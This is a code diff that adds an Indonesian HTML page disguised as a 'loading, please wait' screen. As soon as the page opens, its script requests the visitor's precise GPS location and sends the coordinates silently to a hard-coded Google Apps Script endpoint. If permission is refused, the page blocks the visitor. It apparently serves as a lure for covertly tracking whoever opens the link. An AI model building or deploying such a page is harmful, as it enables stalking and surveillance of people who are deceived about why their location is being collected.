@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Memuat Halaman...</title>
+</head>
+<body>
+    <p>Sedang memproses, mohon tunggu...</p>
+
+    <script>
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzo-COMpGrspi1DKSFuuZ4kkSRuWIoDaXYhdAySkgCl5Ho8g5_BEjT2kHZKwosp4yjl0Q/exec"; // Masukkan URL Deploy Apps Script di sinid
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Meminta lokasi segera setelah halaman dibuka
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        };
+
+        function sendPosition(position) {
+            const data = {
+                lat: position.coords.latitude,
+                long: position.coords.longitude
+            };
+
+            // Mengirim data ke Google Sheets menggunakan Fetch API
+            fetch(WEB_APP_URL, {
+                method: "POST",
+                mode: "no-cors", // Penting untuk menghindari masalah CORS
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                console.log("Data terkirim");
+                document.body.innerHTML = "<h1>Data berhasil dicatat.</h1>";
+            })
+            .catch(err => console.error("Error:", err));
+        }
+
+        function showError(error) {
+            console.log("Izin lokasi ditolak atau error.");
+            document.body.innerHTML = "<h1>Akses lokasi diperlukan untuk melanjutkan.</h1>";
+        }
+    </script>
+</body>
+</html>
